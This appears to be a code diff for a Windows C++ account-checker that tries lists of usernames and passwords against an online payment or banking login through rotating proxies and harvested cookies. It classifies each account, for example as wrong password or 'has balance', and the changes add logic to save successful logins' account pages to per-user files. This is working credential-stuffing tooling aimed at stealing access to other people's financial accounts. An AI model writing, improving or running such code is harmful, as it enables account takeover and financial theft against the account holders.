@@ -371,6 +371,20 @@ int CPaypayDlg::Login2(string username, string password, wstring proxy, wstring 
 		{
 			return LOGIN_ERROR_CONNECT;
 		}
+
+		if (shttpResponseContent.length() >= 1024)
+		{
+			string a=shttpResponseContent.substr(shttpResponseContent.length()-10,10);
+			if (a.find("</html>") < 0)
+			{ 
+				return LOGIN_ERROR_CONNECT;
+			}
+		}
+		else
+		{
+			return LOGIN_ERROR_CONNECT;
+		}
+
 		if (((int)shttpResponseContent.find("We do not recognize your username and/or password")) > 0)  //密码错误
 		{
 			return LOGIN_ERROR_FAIL;    
@@ -379,6 +393,22 @@ int CPaypayDlg::Login2(string username, string password, wstring proxy, wstring 
 		{
 			return LOGIN_ERROR_COOKIE;
 		}
+		else if (((int)shttpResponseContent.find("Sign On to View Your Accounts")) > 0)
+		{
+			return LOGIN_ERROR_COOKIE;
+		}
+
+		TCHAR szFilePath[MAX_PATH + 1]={0};
+		GetModuleFileName(NULL, szFilePath, MAX_PATH);
+		(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
+		CString str_url = szFilePath; 
+		wstring wname = wstring(username.begin(),username.end());
+		wstring jmk = wstring(szFilePath) + wname + L".txt";
+		ofstream outfile(jmk,ios_base::app); 
+		string dd = shttpResponseContent;
+		outfile<<dd;
+		outfile.close();
+
 		return LOGIN_ERROR_SUCCESS;
 }
 // 创建Dump文件
@@ -642,7 +672,7 @@ void   ReStart(BOOL   bNormal)
 
 }
 
-wstring g_name[12] = {
+wstring g_name[13] = {
 	L"网络异常，可能是代理不能用，可能是网络连接失败",
 	L"验证码识别失败",	    //验证码识别失败
 	L"代理不可用",      //代理不可用
@@ -655,6 +685,7 @@ wstring g_name[12] = {
 	L"未知状态",     //账号状态位置
 	L"有余额",
 	L"没有余额",
+	L"cookie不可用",
 };
 DWORD WINAPI execute(LPVOID lpParamter)
 {
@@ -664,21 +695,21 @@ DWORD WINAPI execute(LPVOID lpParamter)
 	string password = "";
 	while(is_break) 
 	{ 
-		WaitForSingleObject(hMutex, INFINITE);
+		WaitForSingleObject(cookieMutex, INFINITE);
 		if (CookieProcess::proxyCookieQueue.size() == 0)
 		{
  			wstring mg = L"等待获取cookie";
-			ReleaseMutex(hMutex);
+			ReleaseMutex(cookieMutex);
 			//((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,mg.c_str());
 			continue;
 		}
-		ReleaseMutex(hMutex);
+		ReleaseMutex(cookieMutex);
 		WaitForSingleObject(hMutex, INFINITE);
 		vector<my_struct> *par = &((CPaypayDlg*)lpParamter)->m_all_name_password;
 		vector<my_struct>::iterator iter;
 		if (par->size() > 0)
 		{
-				if (type != 0 && type != 1 && type != 2)
+				if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
 				{
 					iter = par->begin();
 					name = iter->name;
@@ -686,7 +717,7 @@ DWORD WINAPI execute(LPVOID lpParamter)
 					par->erase(iter);
 				}
 		}
-		else if (type != 0 && type != 1 && type != 2)
+		else if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
 		{
 			break;
 		}
@@ -717,6 +748,11 @@ DWORD WINAPI execute(LPVOID lpParamter)
 
 			((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,mg.c_str());
 			WaitForSingleObject(cookieMutex, INFINITE);
+			if (CookieProcess::proxyCookieQueue.size() <=0 )
+			{
+				ReleaseMutex(cookieMutex);
+				continue;
+			}
 			ProxyCookie pc = CookieProcess::proxyCookieQueue.front();
 			ReleaseMutex(cookieMutex);
 			string returnstr = "";
@@ -743,7 +779,12 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			}
 			else if (type == LOGIN_ERROR_COOKIE)
 			{
-				CookieProcess::proxyCookieQueue.pop();
+				WaitForSingleObject(cookieMutex, INFINITE);
+				if (CookieProcess::proxyCookieQueue.size() > 0)
+				{
+					CookieProcess::proxyCookieQueue.pop();
+				}
+				ReleaseMutex(cookieMutex);
 			}
 			else if (type == LOGIN_ERROR_FAIL)
 			{
@@ -773,6 +814,15 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			}
 			if (type == LOGIN_ERROR_PROXY)
 			{
+				WaitForSingleObject(cookieMutex, INFINITE);
+				if (CookieProcess::proxyCookieQueue.size() > 0)
+				{
+					ProxyCookie fr = CookieProcess::proxyCookieQueue.front();
+					CookieProcess::proxyCookieQueue.push(fr);
+					CookieProcess::proxyCookieQueue.pop();
+				}
+				ReleaseMutex(cookieMutex);
+				//CookieProcess::proxyCookieQueue.pop();
 				vector<wstring>::iterator iter = find(g_unUsed_daili.begin(),g_unUsed_daili.end(),proxy);
 				if (iter != g_unUsed_daili.end())
 				{
@@ -814,7 +864,7 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			string data = name + "\t" + password + "\t" + returnstr;
 			setlocale(LC_ALL, "chs");
 			WaitForSingleObject(hMutex, INFINITE);
-			if (type != 0 && type != 1 && type != 2)
+			if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
 			{
 				g_has_saomiao++;
 				g_has_saomiao_used_time_num++;
